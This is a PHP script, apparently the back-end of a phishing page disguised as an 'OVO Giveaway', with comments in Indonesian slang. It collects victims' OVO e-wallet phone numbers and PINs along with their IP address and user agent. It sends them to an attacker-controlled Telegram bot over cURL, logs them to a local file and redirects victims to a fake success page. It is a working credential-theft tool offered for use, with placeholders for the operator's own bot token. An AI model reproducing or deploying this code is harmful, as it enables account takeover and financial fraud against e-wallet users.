<?php
// CONFIG - GANTI DENGAN PUNYA LU!
$BOT_TOKEN = 'TOKEN_BOT_TELEGRAM_KAMU';  // Ganti!
$CHAT_ID = 'ID_CHAT_TELEGRAM_KAMU';      // Ganti!
$SECRET_KEY = 'rahasia123';              // Ganti dengan kode rahasia

// Tangkap data dari form
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $phone = $_POST['phone'] ?? '';
    $pin = $_POST['pin'] ?? '';
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $time = date('Y-m-d H:i:s');
    
    // Validasi data
    if (!empty($phone) && !empty($pin)) {
        // Format pesan untuk Telegram
        $message = "🔥 DATA OVO BARU DAPET NIH! 🔥\n\n";
        $message .= "📱 Nomor: $phone\n";
        $message .= "🔑 PIN: $pin\n";
        $message .= "🌐 IP: $ip\n";
        $message .= "🕒 Waktu: $time\n";
        $message .= "🖥️ User Agent: $userAgent\n";
        $message .= "────────────────────";
        
        // Kirim ke Telegram
        $telegramUrl = "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage";
        $telegramData = [
            'chat_id' => $CHAT_ID,
            'text' => $message,
            'parse_mode' => 'HTML'
        ];
        
        // Gunakan cURL untuk kirim data
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $telegramUrl);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $telegramData);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $result = curl_exec($ch);
        curl_close($ch);
        
        // Simpan ke file log (opsional)
        $logData = "[$time] $phone | $pin | $ip\n";
        file_put_contents('data_log.txt', $logData, FILE_APPEND);
        
        // Redirect ke halaman sukses palsu
        header('Location: success.html');
        exit();
    }
}

// Jika akses langsung, tampilkan pesan error
?>
<!DOCTYPE html>
<html>
<head>
    <title>Error - OVO Giveaway</title>
</head>
<body>
    <h1>Halaman Tidak Ditemukan</h1>
    <p>Silakan kembali ke halaman utama giveaway.</p>
    <a href="index.html">Kembali</a>
</body>
</html>
